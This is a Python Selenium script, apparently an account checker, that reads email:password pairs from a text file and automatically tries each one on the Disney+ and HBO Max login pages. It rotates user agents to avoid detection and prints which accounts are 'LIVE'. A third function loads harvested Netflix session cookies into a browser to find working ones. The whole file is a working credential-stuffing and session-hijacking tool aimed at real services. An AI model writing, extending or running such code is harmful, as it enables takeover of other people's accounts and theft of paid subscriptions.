from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
from bs4 import BeautifulSoup
from colorama import Fore 
from lxml import html
import time as tmp
import random   
import ast
import re

class Strem:
    def __init__(self):
        #=-----------*=> Variables de Disney <=*------------------#
        self.url_disney_login = 'https://www.disneyplus.com/login'
        self.email = "email"
        self.password = 'password'
        self.button_email = "//form[@id='loginEmail']/div[2]"
        self.button_password = 'password-continue-login'
        self.response_password = '//form/div[1]/span/p/text()'
        self.response_pin = '//form/p[1]/text()' 
        self.error_14 = '//div[@id="password__error"]/text()'
        #=-----------------------*=>@<=*-------------------------#
        
        #=-----------*=> Variables de HBO <=*------------------#
        self.url_hbo_login = "https://play.hbomax.com/signIn"
        self.email_hbo = "EmailTextInput"
        self.password_hbo = "PasswordTextInput"

    def Agent(self):
        user_agent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]
        agente = random.choice(user_agent)
        return agente
        
    def Disney(self,file): 
        with open(f'{file}.txt','r') as file:
            lines = file.readlines()
            options = Options()
            for line in lines:
                Email,Password = (line.strip().split(':'))
                options.set_preference("general.useragent.override",self.Agent())
                driver = webdriver.Firefox(options=options)
                driver.get(self.url_disney_login)
                driver.refresh()
                time = WebDriverWait(driver, 60)
                try:
                    email = time.until(EC.presence_of_element_located((By.ID,self.email)))
                    email.send_keys(Email)
                    button_email = driver.find_element(By.XPATH,self.button_email)
                    button_email.click()
                    tmp.sleep(6)
                    code = html.fromstring(driver.page_source)
                    try:
                        code_text_password = code.xpath(self.response_password)[0]
                        password = time.until(EC.presence_of_element_located((By.ID,self.password)))
                        password.send_keys(Password)
                        button_password = driver.find_element(By.ID,self.button_password)
                        button_password.click()
                        try:
                            tmp.sleep(6)
                            code = html.fromstring(driver.page_source)
                            error_14 = code.xpath(self.error_14)[0]
                            resp = 'Require Password'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                            driver.quit()
                        except:
                            resp = 'LIVE'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.GREEN+resp}')
                            driver.quit()
                    except TimeoutException:
                        resp = 'account not register or subcription vecind'
                        print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        driver.quit()
                    except:
                        code_text_pin = code.xpath(self.response_pin)[0]
                        resp = 'Require Pin'
                        print(Fore.YELLOW+F'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        driver.quit()
                except TimeoutException:
                    driver.refresh()  

    def Hbo(self,file):
        with open(f'{file}.txt','r') as file:
            lines = file.readlines()
            options = Options()
            for line in lines:
                try:
                    Email,Password = (line.strip().split(':'))
                    options.set_preference("general.useragent.override",self.Agent())
                    driver = webdriver.Firefox(options=options)
                    driver.get(self.url_hbo_login)
                    driver.refresh()
                    time = WebDriverWait(driver, 40)
                    tmp.sleep(7)
                    try:
                        email = time.until(EC.presence_of_element_located((By.ID,self.email_hbo)))
                        email.send_keys(Email)
                        password = driver.find_element(By.ID,self.password_hbo)
                        password.send_keys(Password)
                        login = time.until(EC.presence_of_element_located((By.CSS_SELECTOR,'div.r-3691iy')))
                        login.click()
                        tmp.sleep(6)
                        code = html.fromstring(driver.page_source)
                        try:
                            adverten = code.xpath('//span[@class="css-1qaijid"]/text()')[0]
                            resp = 'DEAD'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.RED+resp}')
                            driver.quit()
                        except:
                            resp = 'LIVE'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.GREEN+resp}')
                            driver.quit()
                    except:
                        print('User - Agent No compatible con Hbo')
                        driver.quit()
                except ValueError:
                    pass
                    
    def Netflix(self,file):
        with open(f'{file}.txt', 'r') as file_cookies:#leer_cookies
            read_cookies = file_cookies.read() # leer cookies
            matches = re.findall(r'Cookie: (.+?)\]',read_cookies)
            dominio = "netflix.com"
            driver = webdriver.Firefox()
            if matches:
                  with open(f'{file}.txt','r') as reads_cookies:
                        separacion_fracmentos = [line.strip().split('|') for line in reads_cookies] # cookies    
                        for num in range(len(matches)):#cookie
                            rex = separacion_fracmentos[num][0].replace('Email:','')
                            Email = re.sub(r'\s+','',rex)

                            cookie_string = matches[num] + ']'
                            cookie_dict = ast.literal_eval(cookie_string)[0]
                            name = cookie_dict['name']
                            value = cookie_dict['value']

                            driver.get("https://" + dominio)
                            tmp.sleep(5)
                            driver.delete_all_cookies()

                            cookie = {'name':name,'value':value}
                            driver.add_cookie(cookie)

                            tmp.sleep(5)

                            html_source = driver.page_source
                            parsed_html = html.fromstring(html_source)
                            element = parsed_html.xpath('//ul[@class="choose-profile"]')

                            if element:
                                print(f'{Fore.YELLOW}Cookie Linea {num} {Fore.GREEN}LIVE [✔] {Email}')            
                                driver.refresh()
                            else:
                                print(f"{Fore.YELLOW}Cookie Linea {num} {Fore.RED}DEAD [✘] {Email}")
                            tmp.sleep(3)
                            driver.refresh()
                            tmp.sleep(2)
            else:
                print("No se encontró ninguna cadena con el formato adecuado.")

    def Start_Plus(self):
        pass

strem = Strem()
strem.Disney('account')
